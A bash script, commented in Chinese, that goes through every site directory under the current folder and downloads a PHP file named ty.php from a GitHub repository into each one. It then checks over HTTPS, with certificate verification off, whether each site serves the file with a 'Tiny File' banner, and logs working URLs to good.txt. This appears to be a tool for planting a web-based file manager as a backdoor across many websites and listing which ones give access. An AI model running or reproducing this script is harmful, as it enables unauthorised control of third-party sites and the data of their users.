#!/bin/bash

base_dir="$(pwd)"
source_url="https://github.com/arrow9hc/test2/raw/refs/heads/main/ty.php"

for dir in */; do
    dirname=${dir%/}
    target_file="${base_dir}/${dirname}/ty.php"
    
    echo "========================================="
    echo "Checking $dirname..."
    
    # 步骤1: 下载 ty.php 到本地目录
    echo "  Step 1: Downloading to ${dirname}/ty.php"
    if curl -L -f -s -S "$source_url" -o "$target_file"; then
        if [ -s "$target_file" ]; then
            echo "  ✓ Download successful"
            ls -lh "$target_file"
        else
            echo "  ✗ Downloaded file is empty"
            continue
        fi
    else
        echo "  ✗ Download failed for $dirname"
        continue
    fi
    
    # 步骤2: 通过 HTTPS 访问该域名下的 ty.php
    url="https://${dirname}/ty.php"
    echo "  Step 2: Checking $url"
    
    content=$(curl -s -k "$url")
    
    # 步骤3: 检查内容是否包含 "Tiny File"
    if echo "$content" | grep -q "Tiny File"; then
        echo "  ✓ Content verified: contains 'Tiny File'"
        echo "$url" >> good.txt
        echo "  -> Saved to good.txt: $url"
    else
        echo "  ✗ Content check failed for $url"
        echo "  Received content preview:"
        echo "$content" | head -c 200
    fi
done

echo "========================================="
echo "Done! Results saved in good.txt"
